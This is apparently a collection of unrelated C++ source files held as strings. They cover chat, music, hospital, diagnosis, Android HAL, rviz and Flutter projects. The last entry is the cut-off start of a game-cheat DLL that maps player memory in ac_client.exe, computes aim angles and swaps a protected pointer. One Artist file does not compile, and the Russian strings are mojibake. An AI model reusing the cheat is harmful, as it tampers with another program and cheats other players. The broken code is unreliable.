    "#include \"friendmodel.hpp\"\n#include \"db.h\"\n\n// \u6dfb\u52a0\u597d\u53cb\u5173\u7cfb\n// \u4e3a\u4e86\u7f13\u89e3\u670d\u52a1\u5668\u538b\u529b\uff0c\u4e00\u822c\u628a\u597d\u53cb\u5217\u8868\u5b58\u5728\u5ba2\u6237\u7aef\nvoid FriendModel::insert(int userid, int friendid)\n{\n    //\n    // \u5148\u7ec4\u88c5 SQL\u8bed\u53e5\uff0c\u7136\u540e\u8c03\u7528\u51fd\u6570\u6267\u884cSQL\u8bed\u53e5\uff0c\u6210\u529f\u540e\u83b7\u5f97\u751f\u6210\u7684\u4e3b\u952e id\n    // \u7ec4\u88c5sql\u8bed\u53e5\n    char sql[1024] = {0};\n    // sprintf \u7528\u5728\u8fd9\u91cc\u5f88\u65b9\u4fbf\n    sprintf(sql, \"insert into Friend values(%d, %d)\", userid, friendid);\n    \n    // \u5b9a\u4e49\u4e00\u4e2aMySQL\u5bf9\u8c61\u6765\u53d1\u5c04MySQL\u5230\u6570\u636e\u5e93\u5185\u6838\n    MySQL mysql;\n    if (mysql.connect())\n    {\n        mysql.update(sql);\n\n    }\n}\n\n// \u8fd4\u56de\u7528\u6237\u7684\u597d\u53cb\u5217\u8868\n// \u8fd9\u4e2a\u9700\u8981 user \u8868 \u548c friend \u8868\u7684\u8054\u5408\u67e5\u8be2\nvector<User> FriendModel::query(int userid)\n{\n    //\n    // \u5148\u7ec4\u88c5 SQL\u8bed\u53e5\uff0c\u7136\u540e\u8c03\u7528\u51fd\u6570\u6267\u884cSQL\u8bed\u53e5\uff0c\u6210\u529f\u540e\u83b7\u5f97\u751f\u6210\u7684\u4e3b\u952e id\n    // \u7ec4\u88c5sql\u8bed\u53e5\n    char sql[1024] = {0};\n    // sprintf \u7528\u5728\u8fd9\u91cc\u5f88\u65b9\u4fbf\n    sprintf(sql, \"select a.id,a.name,a.state from User a inner join Friend b on b.friendid=a.id where b.userid=%d\", userid);\n    \n    vector<User> vec;// return this\n\n    // \u5b9a\u4e49\u4e00\u4e2aMySQL\u5bf9\u8c61\u6765\u53d1\u5c04MySQL\u5230\u6570\u636e\u5e93\u5185\u6838\n    MySQL mysql;\n    if (mysql.connect())\n    {\n        MYSQL_RES *res = mysql.query(sql);\n        if (res != nullptr) \n        {\n            // \u8bbe\u7f6e\u8fd4\u56de\u503c\n            MYSQL_ROW row;\n            while ((row = mysql_fetch_row(res)) != nullptr) \n            {\n                // \u4e00\u4e2a\u7528\u6237\u4e00\u4e2a\u7528\u6237\u5730\u586b\u5145\n                User user;\n                user.setId(atoi(row[0]));\n                user.setName(row[1]);\n                user.setState(row[2]);\n                vec.push_back(user);\n            } \n\n            // \u91ca\u653emysql\u8d44\u6e90\n            mysql_free_result(res);\n            return vec;\n        }\n    }\n    return vec;\n}",
    "#include \"Artist.hpp\"\n#include <iostream>\n\nint Artist:: publishedSongs = 0;\n\nArtist::Artist(int id, string name, string email, string password)\n    : User(id, name, email, password) {\n    }\n\nvoid Listener::loginArtista() {\n    string email = getInput(\"Digite seu email: \");\n    string password = getInput(\"Digite sua senha: \");\n    string result = login(email, password);\n    if (result == \"loged\") {\n        cout << \"Logado com sucesso!\" << endl;\n    } else if (result == \"wrong password\") {\n        cout << \"Senha incorreta!\" << endl;\n    } else if (result == \"not registered\") {\n        cout << \"Usu\u00e1rio n\u00e3o cadastrado!\" << endl;\n    }\n}\n\nvoid Artist::publishsong(Id id, Name name, Genre genre, Lyrics lyrics, Duration duration) {\n    Song* new_song = new song(id, name, *this, genre, lyrics, duration, song);\n        this->songs.push_back(*new_song);\n        publishedSongs++;\n}\n\nvoid Artist::deletesong(Song song) {\n        for (int i = 0; i < this->song.size(); i++) {\n            if (this->song[i].getId() == song.getId()) {\n                this->song.erase(this->song.begin() + i);\n            }\n        }    \n        publishedSongs--;\n}\n\nvoid Artist:: publishAlbum(Name name); {\n    Album* new_album = new album(id, name, genre, lyrics, duration, album);\n         this->albun.push_back(*new_albun);   \n} \n\nvoid Artist:: addSongToAlbum(Song song, Albun albun);{\n    for (int i = 0; i < this->albun.size(); i++) {\n        if (this->albun[i].getId() == albun.getId()) {\n            this->albun[i].addSong(song);\n            break;\n}\n\nvoid Artist:: deleteAlbum(Album album); {\n    for (int i = 0; i < this->albun.size(); i++) {\n        if (this->albun[i].getId() == playlist.getId()) {\n            this->albun.erase(this->albun.begin() + i);\n            break;\n}\n\nvoid Artist::increaseCountFollowers() {\n    this->count_followers += 1;\n}\n\n",
    "#include <iostream>\r\n#include <string>\r\n#include <stdlib.h>\r\n#include <ctime>\r\n#include <fstream>\r\n#include<sstream>\r\n#include<iomanip>\r\n#include <vector>\r\n\r\nusing namespace std;\r\n\r\nclass appointment; class admin; class bed;class ward;\r\nstring monthconverte(int);\r\nstruct datetime{int year,mon,day,hour,min,sec;};\r\nvoid timestamptodatetime(datetime &,int timestamp);\r\nint convertToTimestamp(int year, int month, int day, int hour, int minute, int second);\r\n\r\nclass patient{\r\n    private:\r\n    string name;\r\n    double height;\r\n    double weight;\r\n    int id;\r\n    public:\r\n    patient(){name=\"null\";height=0;weight=0;}\r\n    patient(int ID,string NAME,double HEIGHT,double WEIGHT){id=ID;name=NAME;height=HEIGHT;weight=WEIGHT;}\r\n    patient(vector<patient> &arr,string NAME,double HEIGHT,double WEIGHT){name=NAME;height=HEIGHT;weight=WEIGHT;\r\n    int Hid;\r\n    for(int i=0;i<arr.size();i++){\r\n        if(Hid<arr[i].getid()){\r\n            Hid = arr[i].getid();\r\n        }\r\n    }\r\n    id= Hid+1;\r\n    }\r\n    void info();\r\n    int getid(){return id;}\r\n    friend bool idcheck(int,vector<patient> &arr);\r\n    void view_appointment(vector<appointment> &arr);\r\n    bool operator==(patient &a){\r\n        return (a.id == id);\r\n    }\r\n    friend class admin;\r\n    friend class appointment;\r\n    friend class doctor;\r\n    friend void save_patients(vector<patient> &,string);\r\n};\r\nclass doctor{\r\n    private:\r\n    string name;\r\n    string major;\r\n    string phonenumber;\r\n    int id;\r\n    public:\r\n    doctor(){name=\"null\";major=\"non\";phonenumber=\"0000\";}\r\n    doctor(int ID,string NAME,string MAJOR,string Phonenumber){id=ID;name=NAME;major=MAJOR;phonenumber=Phonenumber;}\r\n    void diagnos_patient(appointment &AP,string D);\r\n    void add_meds(appointment &AP,string D);\r\n    string getPdiagnos(appointment &AP);\r\n    void info();\r\n    void viewappointment_byline(appointment);\r\n    friend bool idcheck(int,vector<doctor> &arr);\r\n    friend class admin;\r\n    friend class appointment;\r\n    int getid(){return id;}\r\n    bool operator==(doctor &d){\r\n        return (d.id == id);\r\n    }\r\n};\r\nclass appointment{\r\n    private:\r\n    int patientID;\r\n    int doctorID;\r\n    int CREATEDtime;\r\n    int timeON;\r\n    string diagnosis=\"\";\r\n    string medicine=\"\";\r\n    patient P;\r\n    doctor D;\r\n    void diagnos(string);\r\n    void addmeds(string);\r\n    string getdiagnos(){return diagnosis;};\r\n    public:\r\n    bool appintmentclose;\r\n    bool checkappintmentstatus(){if(diagnosis == \"\" && medicine ==\"\"){appintmentclose = 0;}else{appintmentclose = 1;}return appintmentclose;}\r\n    patient getpatient(){return P;}\r\n    doctor getdoctor(){return D;}\r\n    appointment(){}\r\n     appointment(int Pid,int Did,int month,int day,int hour,string dia,string med){patientID=Pid;doctorID=Did;CREATEDtime=time(NULL);\r\n     timeON=convertToTimestamp(2024,month,day,hour,0,0); diagnosis=dia;medicine=med; if(diagnosis == \"\"){appintmentclose = 0;}};\r\n\r\n    appointment(int Pid,int Did,int Otime,string dia,string med,int ctime){\r\n    patientID=Pid;doctorID=Did;CREATEDtime=ctime;\r\n    timeON=Otime; diagnosis=dia;medicine=med;if(diagnosis == \"\"){appintmentclose = 0;}\r\n    }\r\n    bool operator==(appointment &app){\r\n        return (app.CREATEDtime == CREATEDtime);\r\n    }\r\n    void confirm(vector<doctor> &,vector<patient> &);\r\n    friend void save_appintments(vector<appointment> &,string appointmentfile);\r\n    friend class admin;\r\n    friend class doctor;\r\n};\r\nclass admin{\r\n\r\n    public:\r\n    void edit_appointment(appointment &temp,vector<patient> &patients,vector<doctor> &doctors);\r\n    void view_appointment(appointment A);\r\n    void viewinline_appointment(appointment A);\r\n};\r\nclass bed{\r\n    private:\r\n    patient *P;\r\n    doctor *D;\r\n    int bednumber;\r\n    public:\r\n    bed(patient *p,doctor *d,int num){P=p;D=d;bednumber=num;}\r\n    bed(int num){P=nullptr;D=nullptr;bednumber=num;}\r\n    void assignPatient(patient* p) {P=p;}\r\n    void assignDoctor(doctor* d) {D=d;}\r\n    patient* getPatient(){ return P; }\r\n    doctor* getDoctor(){ return D; }\r\n    int getBedNumber(){ return bednumber; }\r\n    void dischargePatient() { P = nullptr;D = nullptr;}\r\n    friend void save_ward(ward &W,string wardfile);\r\n};\r\nclass ward{\r\n    private:\r\n    vector<bed> beds;\r\n    string wardname;\r\n    int maxbeds=10;\r\n    public:\r\n    ward(string name){\r\n        wardname = name;\r\n        for(int i=0;i<maxbeds;i++){beds.push_back(bed(i));}}\r\n    string getwardname(){return wardname;}\r\n    bed* getbed(int bednum){\r\n        for(int i=0;i<beds.size();i++){\r\n            if(bednum == beds[i].getBedNumber()){\r\n                return &beds[i];\r\n            }\r\n        }\r\n        return nullptr;\r\n    }\r\n    int getbedsize(){return maxbeds;}\r\n    void assignPtobed(patient *p,int bednumber){\r\n        bed *BED = getbed(bednumber);\r\n        if(BED){\r\n            BED->assignPatient(p);\r\n\r\n        }\r\n    }\r\n    void assignDtobed(doctor *d,int bednumber){\r\n        bed *BED = getbed(bednumber);\r\n        if(BED){\r\n            BED->assignDoctor(d);\r\n    ",
    "#include<bits/stdc++.h>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n    setlocale(LC_ALL, \"Russian\");\r\n\r\n    vector < pair < pair < int, int >, vector < double > > > info_age = {\r\n        {{0, 1}, {0.2, 1.0, 0.0, 0.4, 0.1}},\r\n        {{1, 3}, {1.0, 1.0, 0.0, 0.2, 0.26}},\r\n        {{3, 14}, {0.2, 1.0, 0.0, 0.2, 0.68}},\r\n        {{14, 25}, {0.2, 0.11, 0.0, 1.0, 0.81}},\r\n        {{25, 40}, {0.2, 0.11, 0.0, 1.0, 0.84}},\r\n        {{40, 60}, {0.2, 0.01, 0.0, 1.0, 0.9}},\r\n        {{60, 200}, {0.3, 0.0, 1.0, 1.0, 1.0}}\r\n    };\r\n\r\n    vector < vector < double > > info_symptoms = {\r\n        {0.0, 0.96, 0.0, 0.0, 0.0},\r\n        {1.0, 1.0, 0.0, 0.2, 0.67},\r\n        {0.0, 0.0, 0.93, 0.2, 0.33},\r\n        {0.35, 1.0, 0.89, 1.0, 0.0},\r\n        {0.0, 0.68, 0.39, 0.2, 0.0},\r\n        {0.53, 0.71, 1.0, 1.0, 1.0}\r\n    };\r\n\r\n    vector < vector < double > > info_cause = {\r\n        {1.0, 1.0, 1.0, 1.0, 0.34},\r\n        {0.0, 0.0, 0.71, 0.0, 0.0},\r\n        {0.0, 0.0, 0.0, 0.0, 0.35},\r\n        {0.0, 0.35, 0.0, 0.5, 1.0},\r\n    };\r\n\r\n    vector < string > diagnosis = {\"\u00c3\u00ee\u00f0\u00e4\u00e5\u00ee\u00eb\u00f3\u00ec \u00e8 \u00f5\u00e0\u00eb\u00e0\u00e7\u00e8\u00ee\u00ed\", \"\u00c2\u00ee\u00f1\u00ef\u00e0\u00eb\u00e5\u00ed\u00e8\u00e5 \u00e2\u00e5\u00ea\", \"\u00c1\u00ee\u00eb\u00e5\u00e7\u00ed\u00e8 \u00e2\u00e5\u00ea\", \"\u00c1\u00ee\u00eb\u00e5\u00e7\u00ed\u00e8 \u00f1\u00eb\u00e5\u00e7\u00ed\u00ee\u00e3\u00ee \u00e0\u00ef\u00ef\u00e0\u00f0\u00e0\u00f2\u00e0\", \"\u00c1\u00ee\u00eb\u00e5\u00e7\u00ed\u00e8 \u00e3\u00eb\u00e0\u00e7\u00ed\u00e8\u00f6\u00fb\"};\r\n\r\n    vector < double > uT(diagnosis.size(), 0.0);\r\n    vector < double > uS(diagnosis.size(), 0.0);\r\n    vector < double > uP(diagnosis.size(), 0.0);\r\n\r\n\r\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00c2\u00e0\u00f8 \u00e2\u00ee\u00e7\u00f0\u00e0\u00f1\u00f2:\" << endl;\r\n    int age;\r\n    cin >> age;\r\n    int age_c = 0;\r\n    for (int i = 0; i < info_age.size(); i++) {\r\n        if (info_age[i].first.first <= age && age < info_age[i].first.second) {\r\n            age_c = i;\r\n        }\r\n    }\r\n    uT = info_age[age_c].second;\r\n\r\n    vector < string > symptoms = {\"\u00d2\u00e5\u00ec\u00ef\u00e5\u00f0\u00e0\u00f2\u00f3\u00f0\u00e0\", \"\u00ce\u00f2\u00e5\u00ea \u00e2 \u00ee\u00e1\u00eb\u00e0\u00f1\u00f2\u00e8 \u00e3\u00eb\u00e0\u00e7\", \"\u00d1\u00ed\u00e8\u00e6\u00e5\u00ed\u00e8\u00e5 \u00ee\u00f1\u00f2\u00f0\u00ee\u00f2\u00fb \u00e7\u00f0\u00e5\u00ed\u00e8\u00ff\", \"\u00d1\u00eb\u00e5\u00e7\u00ee\u00f2\u00e5\u00f7\u00e5\u00ed\u00e8\u00e5\", \"\u00d1\u00f3\u00f5\u00ee\u00f1\u00f2\u00fc \u00e2 \u00e3\u00eb\u00e0\u00e7\u00f3\", \"\u00ca\u00ee\u00f1\u00ec\u00e5\u00f2\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e9 \u00e4\u00e5\u00f4\u00e5\u00ea\u00f2\"};\r\n    cout << \"\u00c4\u00e0\u00e2\u00e0\u00e9\u00f2\u00e5 \u00f3\u00e7\u00ed\u00e0\u00e5\u00ec, \u00ea\u00e0\u00ea\u00e8\u00e5 \u00f3 \u00e2\u00e0\u00f1 \u00e5\u00f1\u00f2\u00fc \u00f1\u00e8\u00ec\u00ef\u00f2\u00ee\u00ec\u00fb:\" << endl;\r\n    for (int i = 0; i < symptoms.size(); i++) {\r\n        cout << \"\u00c5\u00f1\u00f2\u00fc \u00eb\u00e8 \u00f3 \u00e2\u00e0\u00f1 \" << symptoms[i] << \"? \u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 Y, \u00e5\u00f1\u00eb\u00e8 \u00e4\u00e0, \u00e8 N \u00e8\u00ed\u00e0\u00f7\u00e5.\" << endl;\r\n        string res;\r\n        cin >> res;\r\n        if (res == \"Y\") {\r\n            for (int j = 0; j < diagnosis.size(); j++) {\r\n                if (info_symptoms[i][j] > 0.0) {\r\n                    if (uS[j] == 0 || info_symptoms[i][j] < uS[j]) uS[j] = info_symptoms[i][j];\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    vector < string > cause = {\"\u00c8\u00ed\u00f4\u00e5\u00ea\u00f6\u00e8\u00ee\u00ed\u00ed\u00ee\u00e5 \u00e7\u00e0\u00e1\u00ee\u00eb\u00e5\u00e2\u00e0\u00ed\u00e8\u00e5\", \"\u00d2\u00f0\u00e0\u00e2\u00ec\u00e0 \u00e3\u00eb\u00e0\u00e7\u00e0\", \"\u00c2\u00f0\u00ee\u00e6\u00e4\u00e5\u00ed\u00ed\u00ee\u00e5 \u00e7\u00e0\u00e1\u00ee\u00eb\u00e5\u00e2\u00e0\u00ed\u00e8\u00e5\", \"\u00c7\u00e0\u00e1\u00ee\u00eb\u00e5\u00e2\u00e0\u00ed\u00e8\u00ff \u00e4\u00f0\u00f3\u00e3\u00e8\u00f5 \u00ee\u00f0\u00e3\u00e0\u00ed\u00ee\u00e2\"};\r\n    cout << \"\u00c4\u00e0\u00e2\u00e0\u00e9\u00f2\u00e5 \u00f3\u00e7\u00ed\u00e0\u00e5\u00ec \u00e2\u00ee\u00e7\u00ec\u00ee\u00e6\u00ed\u00fb\u00e5 \u00ef\u00f0\u00e8\u00f7\u00e8\u00ed\u00fb \u00e2\u00ee\u00e7\u00ed\u00e8\u00ea\u00ed\u00ee\u00e2\u00e5\u00ed\u00e8\u00ff:\" << endl;\r\n    for (int i = 0; i < cause.size(); i++) {\r\n        cout << \"\u00cc\u00ee\u00e6\u00e5\u00f2 \u00e1\u00fb\u00f2\u00fc \" << cause[i] << \"? \u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 Y, \u00e5\u00f1\u00eb\u00e8 \u00e4\u00e0, \u00e8 N \u00e8\u00ed\u00e0\u00f7\u00e5.\" << endl;\r\n        string res;\r\n        cin >> res;\r\n        if (res == \"Y\") {\r\n            for (int j = 0; j < diagnosis.size(); j++) {\r\n                if (info_cause[i][j] > 0.0) {\r\n                    if (uP[j] == 0 || info_cause[i][j] < uP[j]) uP[j] = info_cause[i][j];\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    vector < double > umin;\r\n\r\n    for (int i = 0; i < uT.size(); i++) {\r\n        double res = 1.0;\r\n        if (uT[i] > 0.0) res = min(res, uT[i]);\r\n        if (uS[i] > 0.0) res = min(res, uS[i]);\r\n        if (uP[i] > 0.0) res = min(res, uP[i]);\r\n        umin.push_back(res);\r\n    }\r\n\r\n    double umax = 0;\r\n    for (auto key : umin) umax = max(umax, key);\r\n\r\n    for (int i = 0; i < umin.size(); i++) {\r\n        if (umin[i] == umax) {\r\n            cout << \"\u00c2\u00e0\u00f8 \u00ef\u00f0\u00e5\u00e4\u00ef\u00ee\u00eb\u00e0\u00e3\u00e0\u00e5\u00ec\u00fb\u00e9 \u00e4\u00e8\u00e0\u00e3\u00ed\u00ee\u00e7: \" << diagnosis[i] << endl;\r\n            exit(0);\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n",
    "/*\n * Copyright (C) 2021 The LineageOS Project\n *\n * SPDX-License-Identifier: Apache-2.0\n */\n\n#include <aidl/android/hardware/power/BnPower.h>\n#include <android-base/file.h>\n#include <android-base/logging.h>\n#include <sys/ioctl.h>\n\n#define SET_CUR_VALUE 0\n#define TOUCH_DOUBLETAP_MODE 14\n#define TOUCH_MAGIC 't'\n#define TOUCH_IOC_SETMODE _IO(TOUCH_MAGIC, SET_CUR_VALUE)\n#define TOUCH_DEV_PATH \"/dev/xiaomi-touch\"\n#define TOUCH_ID 0\n\nnamespace aidl {\nnamespace android {\nnamespace hardware {\nnamespace power {\nnamespace impl {\n\nusing ::aidl::android::hardware::power::Mode;\n\nbool isDeviceSpecificModeSupported(Mode type, bool* _aidl_return) {\n    switch (type) {\n        case Mode::DOUBLE_TAP_TO_WAKE:\n            *_aidl_return = true;\n            return true;\n        default:\n            return false;\n    }\n}\n\nbool setDeviceSpecificMode(Mode type, bool enabled) {\n    switch (type) {\n        case Mode::DOUBLE_TAP_TO_WAKE: {\n            int fd = open(TOUCH_DEV_PATH, O_RDWR);\n            int arg[3] = {TOUCH_ID, TOUCH_DOUBLETAP_MODE, enabled ? 1 : 0};\n            ioctl(fd, TOUCH_IOC_SETMODE, &arg);\n            close(fd);\n            return true;\n        }\n        default:\n            return false;\n    }\n}\n\n}  // namespace impl\n}  // namespace power\n}  // namespace hardware\n}  // namespace android\n}  // namespace aidl\n",
    "/*\n * Copyright (c) 2012, Willow Garage, Inc.\n * All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are met:\n *\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above copyright\n *       notice, this list of conditions and the following disclaimer in the\n *       documentation and/or other materials provided with the distribution.\n *     * Neither the name of the Willow Garage, Inc. nor the names of its\n *       contributors may be used to endorse or promote products derived from\n *       this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE\n * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\n * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\n * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\n * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n */\n\n#include <OgreSceneNode.h>\n#include <OgreSceneManager.h>\n\n#include <ros/time.h>\n\n#include <rviz/default_plugin/point_cloud_common.h>\n#include <rviz/default_plugin/point_cloud_transformers.h>\n#include <rviz/display_context.h>\n#include <rviz/frame_manager.h>\n#include <rviz/ogre_helpers/point_cloud.h>\n#include <rviz/properties/int_property.h>\n#include <rviz/validate_floats.h>\n\n#include \"voxelslam_pc2.hpp\"\n\nnamespace voxelslam_pointcloud2\n{\nPointCloud2Display::PointCloud2Display() : point_cloud_common_(new rviz::PointCloudCommon(this))\n{\n}\n\nPointCloud2Display::~PointCloud2Display()\n{\n  PointCloud2Display::unsubscribe();\n  delete point_cloud_common_;\n}\n\nvoid PointCloud2Display::onInitialize()\n{\n  // Use the threaded queue for processing of incoming messages\n  update_nh_.setCallbackQueue(context_->getThreadedQueue());\n\n  MFDClass::onInitialize();\n  point_cloud_common_->initialize(context_, scene_node_);\n}\n\nvoid PointCloud2Display::processMessage(const sensor_msgs::PointCloud2ConstPtr& cloud)\n{\n  // Filter any nan values out of the cloud.  Any nan values that make it through to PointCloudBase\n  // will get their points put off in lala land, but it means they still do get processed/rendered\n  // which can be a big performance hit\n  sensor_msgs::PointCloud2Ptr filtered(new sensor_msgs::PointCloud2);\n  int32_t xi = rviz::findChannelIndex(cloud, \"x\");\n  int32_t yi = rviz::findChannelIndex(cloud, \"y\");\n  int32_t zi = rviz::findChannelIndex(cloud, \"z\");\n\n  if (xi == -1 || yi == -1 || zi == -1)\n  {\n    return;\n  }\n\n  const uint32_t xoff = cloud->fields[xi].offset;\n  const uint32_t yoff = cloud->fields[yi].offset;\n  const uint32_t zoff = cloud->fields[zi].offset;\n  const uint32_t point_step = cloud->point_step;\n  const size_t point_count = cloud->width * cloud->height;\n\n  if (point_count * point_step != cloud->data.size())\n  {\n    std::stringstream ss;\n    ss << \"Data size (\" << cloud->data.size() << \" bytes) does not match width (\" << cloud->width\n       << \") times height (\" << cloud->height << \") times point_step (\" << point_step\n       << \").  Dropping message.\";\n    setStatusStd(rviz::StatusProperty::Error, \"Message\", ss.str());\n    return;\n  }\n\n  filtered->data.resize(cloud->data.size());\n  uint32_t output_count;\n  if (point_count == 0)\n  {\n    output_count = 0;\n  }\n  else\n  {\n    uint8_t* output_ptr = &filtered->data.front();\n    const uint8_t *ptr = &cloud->data.front(), *ptr_end = &cloud->data.back(), *ptr_init;\n    size_t points_to_copy = 0;\n    for (; ptr < ptr_end; ptr += point_step)\n    {\n      float x = *reinterpret_cast<const float*>(ptr + xoff);\n      float y = *reinterpret_cast<const float*>(ptr + yoff);\n      float z = *reinterpret_cast<const float*>(ptr + zoff);\n      if (rviz::validateFloats(x) && rviz::validateFloats(y) && rviz::validateFloats(z))\n      {\n        if (points_to_copy == 0)\n        {\n          // Only memorize where to start copying from\n          ptr_init = ptr;\n          points_to_copy = 1;\n        }\n        else\n        {\n          ++points_to_copy;\n        }\n      }\n      else\n      {\n        if (points_to_copy)\n        {\n          // Copy all the points that need to be copied\n          memcpy(output_ptr, ptr_init, point_step * points_to_copy);\n          output_ptr += point_step * points_to_copy;\n          points_to_copy = 0;\n        }\n      }\n    }\n    // Don't forget to flush what needs to be copied\n ",
    "#include <gtest/gtest.h>\n#include \"../include/junior_developer.hpp\"\n#include \"../include/senior_developer.hpp\"\n#include <fstream>\n\n// Helper function to capture standard output\nstd::string capture_stdout(std::function<void()> func) {\n    std::ostringstream oss;\n    auto old_buf = std::cout.rdbuf(oss.rdbuf());\n    func();\n    std::cout.rdbuf(old_buf);\n    return oss.str();\n}\n\n// Helper function to create a temporary logo file for testing\nvoid create_temp_logo_file(const std::string& path, const std::string& content) {\n    std::ofstream file(path);\n    file << content;\n}\n\n// Test the constructor of the JuniorDeveloper class\nTEST(DeveloperTest, Constructor) {\n    JuniorDeveloper dev(\"John Doe\", \"johnd\");\n    EXPECT_EQ(dev.get_name(), \"John Doe\");\n    EXPECT_EQ(dev.get_alias(), \"johnd\");\n}\n\n// Test the get_name method of the JuniorDeveloper class\nTEST(DeveloperTest, GetName) {\n    JuniorDeveloper dev(\"John Doe\", \"johnd\");\n    EXPECT_EQ(dev.get_name(), \"John Doe\");\n}\n\n// Test the get_alias method of the JuniorDeveloper class\nTEST(DeveloperTest, GetAlias) {\n    JuniorDeveloper dev(\"John Doe\", \"johnd\");\n    EXPECT_EQ(dev.get_alias(), \"johnd\");\n}\n\n// Test the drink_coffee method of the JuniorDeveloper class\nTEST(DeveloperTest, DrinkCoffee) {\n    JuniorDeveloper dev(\"John Doe\", \"johnd\");\n    std::string output = capture_stdout([&] { dev.drink_coffee(); });\n    EXPECT_EQ(output, \"Ahhhh, I needed that coffee!!!\\n\");\n}\n\n// Test loading a logo from an invalid file path\nTEST(DeveloperTest, LoadLogoFromFileInvalid) {\n    JuniorDeveloper dev(\"John Doe\", \"johnd\");\n    EXPECT_THROW(dev.load_logo_from_file(\"invalid_path/logo.txt\"), std::runtime_error);\n}\n\n// Test the load_logo_from_file method\nTEST(DeveloperTest, LoadLogoFromFile) {\n    const std::string tempFilePath = \"./temp_logo.txt\";\n    const std::string logoContent = \"This is a logo.\";\n\n    // Step 1: Ensure logo is empty before loading\n    JuniorDeveloper dev(\"John Doe\", \"johnd\");\n    EXPECT_EQ(dev.get_logo(), \"\");\n\n    // Step 2: Load logo from a valid file and check the content\n    create_temp_logo_file(tempFilePath, logoContent);\n    dev.load_logo_from_file(tempFilePath);\n    EXPECT_EQ(dev.get_logo(), logoContent);\n\n    // Cleanup the temporary file\n    std::remove(tempFilePath.c_str());\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tp06\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dllmain.cpp : Defines the entry point for the DLL application.\r\n#include \"stdafx.h\"\r\n#include <Windows.h>\r\n#include <gl\\GL.h>\r\n#pragma comment(lib, \"opengl32.lib\")\r\n#include \"geom.h\"\r\n\r\nclass CPlayer\r\n{\r\nprivate:\r\n\tBYTE _pad0[0x4];\r\npublic:\r\n\tvec head; //0x04\r\n\tvec vel; //0x10\r\nprivate:\r\n\tBYTE _pad1[0xC];\r\npublic:\r\n\tvec pos; //0x28\r\n\tvec rot;\r\nprivate:\r\n\tBYTE _pad2[0xAC];\r\npublic:\r\n\tDWORD health; //0xEC\r\nprivate:\r\n\tBYTE _pad3[0x114];\r\npublic:\r\n\tBYTE shooting;\r\n\tCHAR nick[0x20]; //0x205\r\nprivate:\r\n\tBYTE _pad4[0xE7];\r\npublic:\r\n\tDWORD team; //0x30C\r\n};\r\nclass CPlayerList\r\n{\r\npublic:\r\n\tCPlayer* player[0x20];\r\n};\r\nclass CGame //ac_client.exe+18AC00\r\n{\r\npublic:\r\n\tCPlayer* local;\r\n\tCPlayerList* remote;\r\nprivate:\r\n\tDWORD _pad0;\r\npublic:\r\n\tDWORD count;\r\n};\r\n\r\nvoid ClampAngles(vec* a)\r\n{\r\n\tif (a->y > 88.f) a->y = 88.f;\r\n\tif (a->y < -88.f) a->y = -88.f;\r\n\twhile (a->x < 0.f) a->x += 360.f;\r\n\twhile (a->x >= 360.f) a->x -= 360.f;\r\n}\r\nvec LookAt(vec v)\r\n{\r\n\tvec a(0.f, 0.f, 0.f);\r\n\ta.x = ::atanf(v.x / v.y) * -57.2957795f;\r\n\ta.y = ::atanf(v.z / ::sqrtf(v.x*v.x + v.y*v.y)) * -57.2957795f;\r\n\tif (v.y < 0.f) a.x += 180.f;\r\n\tClampAngles(&a);\r\n\treturn a;\r\n}\r\n\r\nvoid* SwapProtectedPointer(void** pPtr, void* pNew)\r\n{\r\n\tDWORD protect;\r\n\tVirtualProtect(pPtr, sizeof(void*), PAGE_READWRITE, &protect);\r\n\tvoid* orig = 